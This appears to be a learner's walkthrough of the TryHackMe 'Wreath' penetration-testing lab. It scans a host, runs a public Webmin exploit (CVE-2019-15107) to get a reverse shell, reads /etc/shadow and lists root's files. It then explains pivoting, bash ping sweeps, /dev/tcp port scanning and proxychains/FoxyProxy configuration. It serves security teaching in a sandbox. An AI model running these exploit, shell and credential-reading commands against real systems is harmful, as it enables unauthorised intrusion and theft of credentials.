## Wreath

Designed as a learning resource for beginners with a primary focus on:

- Pivoting
- Working with the Empire C2 (Command and Control) framework
- Simple Anti-Virus evasion techniques


The following topics will also be covered, albeit more briefly:

- Code Analysis (Python and PHP)
- Locating and modifying public exploits
- Simple webapp enumeration and exploitation
- Git Repository Analysis
- Simple Windows Post-Exploitation techniques
- CLI Firewall Administration (CentOS and Windows)
- Cross-Compilation techniques
- Coding wrapper programs
- Simple exfiltration techniques
- Formatting a pentest report
- These will be taught in the course of exploiting the Wreath network.

This is designed as almost a sandbox environment to follow along with the teaching content; the focus will be on the above teaching points, rather than on initial access and privilege escalation exploits (contrary to other boxes on the platform where the focus is on the challenge).

## BackStory

Out of the blue, an old friend from university: Thomas Wreath, calls you after several years of no contact. You spend a few minutes catching up before he reveals the real reason he called:

"So I heard you got into hacking? That's awesome! I have a few servers set up on my home network for my projects, I was wondering if you might like to assess them?"

You take a moment to think about it, before deciding to accept the job -- it's for a friend after all.

Turning down his offer of payment, you tell him:

## Brief

- Thomas has sent over the following information about the network:
- There are two machines on my home network that host projects and stuff I'm working on in my own time -- one of them has a webserver that's port forwarded, so that's your way in if you can find a vulnerability! It's serving a website that's pushed to my git server from my own PC for version control, then cloned to the public facing server. See if you can get into these! My own PC is also on that network, but I doubt you'll be able to get into that as it has protections turned on, doesn't run anything vulnerable, and can't be accessed by the public-facing section of the network. Well, I say PC -- it's technically a repurposed server because I had a spare license lying around, but same difference.
- From this we can take away the following pieces of information:
- There are three machines on the network
- There is at least one public facing webserver
- There is a self-hosted git server somewhere on the network
- The git server is internal, so Thomas may have pushed sensitive information into it
- There is a PC running on the network that has antivirus installed, meaning we can hazard a guess that this is likely to be Windows
- By the sounds of it this is likely to be the server variant of Windows, which might work in our favour
- The (assumed) Windows PC cannot be accessed directly from the webserver
- This is enough to get started!

Note: You are also encouraged to treat this Network like a penetration test -- i.e. take notes and screenshots of every step and write a full report at the end (especially if you're not already familiar with writing such reports). Keeping track of any files (e.g. tools or payloads) and users you create would also be a good idea. Reports will not be marked, but the act of writing them is good practice for any professional work -- or certifications -- you may do in the future. There will be more information on the actual report writing in the Debrief & Report task, but for now just focus on extensive notes and screenshots. If you are not already comfortable taking notes, have a look into CherryTree or Notion as hierarchical notetaking applications and focus on documenting every step of the process. This room is written in a way that encourages easy note taking, so note down your kill-chain as you go along, and take lots of screenshots! Reports can be submitted to the room as writeups (in the format specified in the questions of  the Debrief & Report task) -- the first five high-quality writeups submitted to the room are featured here!

## Enumeration

```
nmap -p-15000 -vv 10.200.198.200 -oG initial-scan
nmap -A -p- -T3 10.200.198.200 -oG second-scan
```

![image](https://user-images.githubusercontent.com/89842187/131873064-4b96981a-0c93-4ad5-936f-c2c16dd3fd76.png)

![image](https://user-images.githubusercontent.com/89842187/131873275-cd49604f-edf0-4b7c-8adb-1150a5fe75fe.png)

```
Centos
OpenSSH 8.0
Apache httpd 2.4.37
MiniServ 1.890 (https://github.com/MuirlandOracle/CVE-2019-15107)
```

## Exploitation

In the previous task we found a vulnerable service[1][2] running on the target which will give us the ability to execute commands on the target.

The next step would usually be to find an exploit for this vulnerability. There are often exploits available online for known vulnerabilities (and we will cover searching for these in an upcoming task!), however, in this instance, an exploit is provided here.

Start by cloning the repository. This can be done with the following command:
```
git clone https://github.com/MuirlandOracle/CVE-2019-15107
```
This creates a local copy of the exploit on our attacking machine. Navigate into the folder then install the required Python libraries:
```
cd CVE-2019-15107 && pip3 install -r requirements.txt
```
If this doesn't work, you may need to install pip before downloading the libraries. This can be done with:
```
sudo apt install python3-pip
```
The script should already be executable, but if not, add the executable bit (chmod +x ./CVE-2019-15107.py).

Never run an unknown script from the internet! Read through the code and see if you can get an idea of what it's doing. (Don't worry if you aren't familiar with Python -- in this case the exploit was coded by the author of this content and is being run in a lab environment, so you can infer that it isn't malicious. It is, however, good practice to read through scripts before running them).

Once you're satisfied that the script will do what it says it will, run the exploit against the target!
```
./CVE-2019-15107.py TARGET_IP

shell

nc -nvlp 443
```


[1] https://sensorstechforum.com/cve-2019-15107-webmin/
[2] https://www.webmin.com/exploit.html

## Let’s do a little enumeration, first check for hashes:
```
cat /etc/shadow

[root@prod-serv ]# cat /etc/shadow
cat /etc/shadow
root:$6$i9vT8tk3SoXXxK2P$>HIDDEN>6g0PxK9VqSdy47/qKXad1::0:99999:7:::
```

## With port 22 open there’s a good chance we’ll find SSH credentials:

```
[root@prod-serv .ssh]# cd /root
[root@prod-serv ~]# ls -la
ls -la
total 16664
dr-xr-x---.  3 root root     227 Mar 24 19:39 .
dr-xr-xr-x. 17 root root     224 Nov  7 22:26 ..
-rw-------.  1 root root    1351 Nov  7 13:38 anaconda-ks.cfg
lrwxrwxrwx.  1 root root       9 Nov  7 13:39 .bash_history -> /dev/null
-rw-r--r--.  1 root root      18 May 11  2019 .bash_logout
-rw-r--r--.  1 root root     176 May 11  2019 .bash_profile
-rw-r--r--.  1 root root     176 May 11  2019 .bashrc
-rw-r--r--.  1 root root     100 May 11  2019 .cshrc
lrwxrwxrwx.  1 root root       9 Nov  7 13:55 .mysql_history -> /dev/null
-rw-------.  1 root root       0 Jan  8 22:27 .python_history
drwx------.  2 root root      80 Jan  6 03:29 .ssh
-rw-r--r--.  1 root root     129 May 11  2019 .tcshrc
```

## What is Pivoting?

Pivoting is the art of using access obtained over one machine to exploit another machine deeper in the network. It is one of the most essential aspects of network penetration testing, and is one of the three main teaching points for this room.

Put simply, by using one of the techniques described in the following tasks (or others!), it becomes possible for an attacker to gain initial access to a remote network, and use it to access other machines in the network that would not otherwise be accessible:

![image](https://user-images.githubusercontent.com/89842187/131910948-d760b298-debd-4edf-b100-066a7ea78f4a.png)


In this diagram, there are four machines on the target network: one public facing server, with three machines which are not exposed to the internet. By accessing the public server, we can then pivot to attack the remaining three targets.

Note: This is an example diagram and is not representative of the Wreath Network.

This section will contain a lot of theory for pivoting from both Linux and Windows compromised targets, which we will then put into practice against the next machine in the network. Remember though: you have a sandbox environment available to you with the compromised machine in the Wreath network. After the enumeration tasks coming up, you'll also know about the next machine in the network. Feel free to use these boxes to play around with the tools as you go through the tasks, but be aware that some techniques may be stopped by the firewalls involved (which we will look at mitigating later in the network).

## High-level Overview

The methods we use to pivot tend to vary between the different target operating systems. Frameworks like Metasploit can make the process easier, however, for the time being, we'll be looking at more manual techniques for pivoting.

There are two main methods encompassed in this area of pentesting:

Tunnelling/Proxying: Creating a proxy type connection through a compromised machine in order to route all desired traffic into the targeted network. This could potentially also be tunnelled inside another protocol (e.g. SSH tunnelling), which can be useful for evading a basic Intrusion Detection System (IDS) or firewall
Port Forwarding: Creating a connection between a local port and a single port on a target, via a compromised host
A proxy is good if we want to redirect lots of different kinds of traffic into our target network -- for example, with an nmap scan, or to access multiple ports on multiple different machines.

Port Forwarding tends to be faster and more reliable, but only allows us to access a single port (or a small range) on a target device.

Which style of pivoting is more suitable will depend entirely on the layout of the network, so we'll have to start with further enumeration before we decide how to proceed. It would be sensible at this point to also start to draw up a layout of the network as you see it -- although in the case of this practice network, the layout is given in the box at the top of the screen.

As a general rule, if you have multiple possible entry-points, try to use a Linux/Unix target where possible, as these tend to be easier to pivot from. An outward facing Linux webserver is absolutely ideal.

The remaining tasks in this section will cover the following topics:

- Enumerating a network using native and statically compiled tools
- Proxychains / FoxyProxy
- SSH port forwarding and tunnelling (primarily Unix)
- plink.exe (Windows)
- socat (Windows and Unix)
- chisel (Windows and Unix)
- sshuttle (currently Unix only)
- This is far from an exhaustive list of the tools available for pivoting, so further research is encouraged.


## Enumeration

As always, enumeration is the key to success. Information is power -- the more we know about our target, the more options we have available to us. As such, our first step when attempting to pivot through a network is to get an idea of what's around us.

There are five possible ways to enumerate a network through a compromised host:

- Using material found on the machine. The hosts file or ARP cache, for example
- Using pre-installed tools
- Using statically compiled tools
- Using scripting techniques
- Using local tools through a proxy
- These are written in the order of preference. Using local tools through a proxy is incredibly slow, so should only be used as a last resort. Ideally we want to take advantage of pre-installed tools on the system (Linux systems sometimes have Nmap installed by default, for example). This is an example of Living off the Land (LotL) -- a good way to minimise risk. Failing that, it's very easy to transfer a static binary, or put together a simple ping-sweep tool in Bash (which we'll cover below).


Before anything else though, it's sensible to check to see if there are any pieces of useful information stored on the target. arp -a can be used to Windows or Linux to check the ARP cache of the machine -- this will show you any IP addresses of hosts that the target has interacted with recently. Equally, static mappings may be found in /etc/hosts on Linux, or C:\Windows\System32\drivers\etc\hosts on Windows. /etc/resolv.conf on Linux may also identify any local DNS servers, which may be misconfigured to allow something like a DNS zone transfer attack (which is outwith the scope of this content, but worth looking into). On Windows the easiest way to check the DNS servers for an interface is with ipconfig /all. Linux has an equivalent command as an alternative to reading the resolv.conf file: nmcli dev show.

If there are no useful tools already installed on the system, and the rudimentary scripts are not working, then it's possible to get static copies of many tools. These are versions of the tool that have been compiled in such a way as to not require any dependencies from the box. In other words, they could theoretically work on any target, assuming the correct OS and architecture. For example: statically compiled copies of Nmap for different operating systems (along with various other tools) can be found in various places on the internet. A good (if dated) resource for these can be found here. A more up-to-date (at the time of writing) version of Nmap for Linux specifically can be found here. Be aware that many repositories of static tools are very outdated. Tools from these repositories will likely still do the job; however, you may find that they require different syntax, or don't work in quite the way that you've come to expect.

Note: The difference between a "static" binary and a "dynamic" binary is in the compilation. Most programs use a variety of external libraries (.so files on Linux, or .dll files on Windows) -- these are referred to as "dynamic" programs. Static programs are compiled with these libraries built into the finished executable file. When we're trying to use the binary on a target system we will nearly always need a statically compiled copy of the program, as the system may not have the dependencies installed meaning that a dynamic binary would be unable to run.

Finally, the dreaded scanning through a proxy. This should be an absolute last resort, as scanning through something like proxychains is very slow, and often limited (you cannot scan UDP ports through a TCP proxy, for example). The one exception to this rule is when using the Nmap Scripting Engine (NSE), as the scripts library does not come with the statically compiled version of the tool. As such, you can use a static copy of Nmap to sweep the network and find hosts with open ports, then use your local copy of Nmap through a proxy specifically against the found ports.

Before putting this all into practice let's talk about living off the land shell techniques. Ideally a tool like Nmap will already be installed on the target; however, this is not always the case (indeed, you'll find that Nmap is not installed on the currently compromised server of the Wreath network). If this happens, it's worth looking into whether you can use an installed shell to perform a sweep of the network. For example, the following Bash one-liner would perform a full ping sweep of the 192.168.1.x network:

```
for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &); done

```

This could be easily modified to search other network ranges -- including the Wreath network.

The above command generates a full list of numbers from 1 to 255 and loops through it. For each number, it sends one ICMP ping packet to Radar filler image192.168.1.x as a backgrounded job (meaning that each ping runs in parallel for speed), where i is the current number. Each response is searched for "bytes from" to see if the ping was successful. Only successful responses are shown.

The equivalent of this command in Powershell is unbearably slow, so it's better to find an alternative option where possible. It's relatively straight forward to write a simple network scanner in a language like C# (or a statically compiled scanner written in C/C++/Rust/etc), which can be compiled and used on the target. This, however, is outwith the scope of the Wreath network (although very simple beta examples can be found here for C#, or here for C++).

It's worth noting as well that you may encounter hosts which have firewalls blocking ICMP pings (Windows boxes frequently do this, for example). This is likely to be less of a problem when pivoting, however, as these firewalls (by default) often only apply to external traffic, meaning that anything sent through a compromised host on the network should be safe. It's worth keeping in mind, however.

If you suspect that a host is active but is blocking ICMP ping requests, you could also check some common ports using a tool like netcat.
Port scanning in bash can be done (ideally) entirely natively:

Port scanning in bash can be done (ideally) entirely natively:

```

for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done

```

## Proxychains & Foxyproxy


In this task we'll be looking at two "proxy" tools: Proxychains and FoxyProxy. These both allow us to connect through one of the proxies we'll learn about in the upcoming tasks. When creating a proxy we open up a port on our own attacking machine which is linked to the compromised server, giving us access to the target network.

Think of this as being something like a tunnel created between a port on our attacking box that comes out inside the target network -- like a secret tunnel from a fantasy story, hidden beneath the floorboards of the local bar and exiting in the palace treasure chamber.

Proxychains and FoxyProxy can be used to direct our traffic through this port and into our target network.


Proxychains

Proxychains is a tool we have already briefly mentioned in previous tasks. It's a very useful tool -- although not without its drawbacks. Proxychains can often slow down a connection: performing an nmap scan through it is especially hellish. Ideally you should try to use static tools where possible, and route traffic through proxychains only when required.

That said, let's take a look at the tool itself.

Proxychains is a command line tool which is activated by prepending the command proxychains to other commands. For example, to proxy netcat  through a proxy, you could use the command:


```

proxychains nc 172.16.0.10 23

```

Notice that a proxy port was not specified in the above command. This is because proxychains reads its options from a config file. The master config file is located at /etc/proxychains.conf. This is where proxychains will look by default; however, it's actually the last location where proxychains will look. The locations (in order) are:

```
The current directory (i.e. ./proxychains.conf)
~/.proxychains/proxychains.conf
/etc/proxychains.conf
```

This makes it extremely easy to configure proxychains for a specific assignment, without altering the master file. Simply execute: cp /etc/proxychains.conf ., then make any changes to the config file in a copy stored in your current directory. If you're likely to move directories a lot then you could instead place it in a .proxychains directory under your home directory, achieving the same results. If you happen to lose or destroy the original master copy of the proxychains config, a replacement can be downloaded from here.

https://raw.githubusercontent.com/haad/proxychains/master/src/proxychains.conf
Speaking of the proxychains.conf file, there is only one section of particular use to us at this moment of time: right at the bottom of the file are the servers used by the proxy. You can set more than one server here to chain proxies together, however, for the time being we will stick to one proxy:

![image](https://user-images.githubusercontent.com/89842187/131921176-31ced275-d73b-4493-b2b9-d8db5940abee.png)

Specifically, we are interested in the "ProxyList" section:

```
[ProxyList]
# add proxy here ...
# meanwhile
# defaults set to "tor"
socks4  127.0.0.1 9050
```
It is here that we can choose which port(s) to forward the connection through. By default there is one proxy set to localhost port 9050 -- this is the default port for a Tor entrypoint, should you choose to run one on your attacking machine. That said, it is not hugely useful to us. This should be changed to whichever (arbitrary) port is being used for the proxies we'll be setting up in the following tasks.

There is one other line in the Proxychains configuration that is worth paying attention to, specifically related to the Proxy DNS settings:

![image](https://user-images.githubusercontent.com/89842187/131921211-6f9a23cf-03c6-4884-b470-a4a737b00d16.png)

If performing an Nmap scan through proxychains, this option can cause the scan to hang and ultimately crash. Comment out the proxy_dns line using a hashtag (#) at the start of the line before performing a scan through the proxy!
![image](https://user-images.githubusercontent.com/89842187/131921223-f04fca5c-63ce-4bc0-8130-f1368f50fdfb.png)

Other things to note when scanning through proxychains:

* You can only use TCP scans -- so no UDP or SYN scans. ICMP Echo packets (Ping requests) will also not work through the proxy, so use the  -Pn  switch to prevent Nmap from trying it.
* It will be extremely slow. Try to only use Nmap through a proxy when using the NSE (i.e. use a static binary to see where the open ports/hosts are before proxying a local copy of nmap to use the scripts library).

## FoxyProxy

Proxychains is an acceptable option when working with CLI tools, but if working in a web browser to access a webapp through a proxy, there is a better option available, namely: FoxyProxy!

People frequently use this tool to manage their BurpSuite/ZAP proxy quickly and easily, but it can also be used alongside the tools we'll be looking at in subsequent tasks in order to access web apps on an internal network. FoxyProxy is a browser extension which is available for Firefox and Chrome. There are two versions of FoxyProxy available: Basic and Standard. Basic works perfectly for our purposes, but feel free to experiment with standard if you wish.

After installing the extension in your browser of choice, click on it in your toolbar:

![image](https://user-images.githubusercontent.com/89842187/131921310-a82efdaa-7a52-418f-a862-cbf47433f26a.png)

Click on the "Options" button. This will take you to a page where you can configure your saved proxies. Click "Add" on the left hand side of the screen:


![image](https://user-images.githubusercontent.com/89842187/131921323-2ccc5674-5020-469b-ad6c-6249576fb6fc.png)

Fill in the IP and Port on the right hand side of the page that appears, then give it a name. Set the proxy type to the kind of proxy you will be using. SOCKS4 is usually a good bet, although Chisel (which we will cover in a later task) requires SOCKS5. An example config is given here:

![image](https://user-images.githubusercontent.com/89842187/131921336-0587c4d7-aa6d-4e20-a9d5-fd778c56ddfe.png)

Press Save, then click on the icon in the task bar again to bring up the proxy menu. You can switch between any of your saved proxies by clicking on them:


![image](https://user-images.githubusercontent.com/89842187/131921352-1d08f605-db70-4d3b-853c-4aa3f6dce63f.png)


Once activated, all of your browser traffic will be redirected through the chosen port (so make sure the proxy is active!). Be aware that if the target network doesn't have internet access (like all TryHackMe boxes) then you will not be able to access the outside internet when the proxy is activated. Even in a real engagement, routing your general internet searches through a client's network is unwise anyway, so turning the proxy off (or using the routing features in FoxyProxy standard) for everything other than interaction with the target network is advised.

With the proxy activated, you can simply navigate to the target domain or IP in your browser and the proxy will take care of the rest!
